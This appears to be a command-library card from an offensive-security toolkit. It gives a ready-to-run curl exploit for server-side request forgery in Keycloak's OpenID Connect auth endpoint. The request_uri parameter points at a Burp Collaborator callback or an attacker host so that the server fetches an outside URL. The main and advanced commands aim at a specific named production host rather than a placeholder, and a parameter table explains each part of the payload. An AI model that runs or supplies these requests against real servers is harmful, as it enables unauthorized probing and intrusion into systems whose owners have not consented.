---
id: cmd-uuid-123
data: >-
  curl -k
  "https://sponsoredata.mtn.ci:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://0rs71imlpr20qx2svt6gfrotakga4z.burpcollaborator.net"
tags:
  - ssrf
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.317Z'
verified: false
validated: true
submitted: true
---
# curl-keycloak-ssrf

## Command

```bash
curl -k "https://sponsoredata.mtn.ci:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://0rs71imlpr20qx2svt6gfrotakga4z.burpcollaborator.net"
```

## Description

This curl command sends a crafted GET request to exploit SSRF in Keycloak's OIDC endpoint by setting the request_uri to an external attacker-controlled URL, forcing the server to make an outbound fetch.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Ignore SSL certificate errors | Yes (for self-signed certs) |
| URL | Full endpoint with query parameters including malicious request_uri | Yes |
| `scope` | OIDC scope (openid) | Yes |
| `response_type` | Response type (code) | Yes |
| `redirect_uri` | Valid redirect URI | Yes |
| `state` | OIDC state parameter | Yes |
| `nonce` | OIDC nonce | Yes |
| `client_id` | Client ID for the realm | Yes |
| `request_uri` | Malicious URL for SSRF payload | Yes |

## Examples

### Basic Usage

```bash
curl -k "https://target:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=http://example.com&client_id=security-admin-console&request_uri=http://attacker-payload.com"
```

### Advanced Usage

```bash
curl -k -v "https://sponsoredata.mtn.ci:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://0rs71imlpr20qx2svt6gfrotakga4z.burpcollaborator.net" > response.html
```

## Expected Output

HTTP response headers and body from the Keycloak server, typically a 302 redirect to an authentication page or error. The SSRF is confirmed externally via payload monitoring, not in the curl output.

## Related

- [[Related Procedure|procedures/Exploit-SSRF-in-Keycloak-OIDC-Endpoint]]
